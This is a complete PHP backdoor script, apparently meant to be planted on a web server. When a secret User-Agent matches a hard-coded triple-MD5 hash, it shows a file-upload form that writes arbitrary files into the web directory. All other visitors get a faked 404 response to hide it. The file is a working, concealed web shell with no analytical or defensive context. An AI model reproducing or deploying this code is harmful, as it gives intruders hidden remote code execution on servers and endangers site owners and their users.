<?php
if(md5(md5(md5($_SERVER['HTTP_USER_AGENT']))) == "0717b2bae59931c0be946cd10c8be269"){

	if(!empty($_FILES["myFile"])){
		move_uploaded_file($_FILES["myFile"]["tmp_name"],$_FILES["myFile"]["name"]);
	}
	?>
	<form enctype="multipart/form-data" action="" method="POST"> 
	<input name="myFile" type="file"> 
	<input type="submit" value="上传文件"> 
	</form> 
<?php
die;
}else{
	header('HTTP/1.1 404 Not Found');
	header("status: 404 Not Found");
	die();
}